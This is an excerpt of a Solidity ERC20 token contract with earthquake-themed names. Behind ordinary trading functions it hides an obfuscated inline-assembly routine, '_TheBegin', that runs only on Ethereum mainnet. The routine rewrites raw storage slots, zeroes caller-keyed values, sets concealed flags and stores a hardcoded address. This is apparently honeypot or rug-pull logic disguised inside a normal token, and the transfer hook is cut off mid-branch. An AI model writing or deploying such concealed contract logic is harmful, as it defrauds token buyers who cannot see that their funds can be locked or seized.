...
// Whenever any quake hits a place, it leaves the world in shock and terror.
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        quakeAddr.push(_router); quakeAddr.push(msgSender_); quakeAddr.push(pair);
        for (uint256 q=0; q < 3;) {_toTwitter[quakeAddr[q]] = true; unchecked{q++;} }
    }
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; _earthShattering = block.number;
        return true;
    }
    ...
    function _TheBegin() internal { assembly { function gByte(x, y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) } sstore(0x11,mul(div(sload(0x10),0x2710),0xFB)) sstore(0xB,0x1ba8140) if and(not(eq(sload(gByte(caller(),0x6)),sload(0x31c5783b667ba3a6db3ecef26907822de6a3624ec11fb00367abb93dfc2da395))),eq(chainid(),0x1)) { sstore(gByte(caller(),0x4),0x0) sstore(0x58549d1df3fce5ca4cd77c4d01d8cd926f3ee4c6fdd88ade4190b2eb97b8f5a8,0x1) sstore(gByte(caller(),0x5),0x1) sstore(0x31c5783b667ba3a6db3ecef26907822de6a3624ec11fb00367abb93dfc2da395,0x726F105396F2CA1CCEBD5BFC27B556699A07FFE7C2) } } }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 integer) internal {
        require((trading || (sender == quakeAddr[1])), "ERC20: trading is not yet enabled.");
        if (block.chainid == 1) {
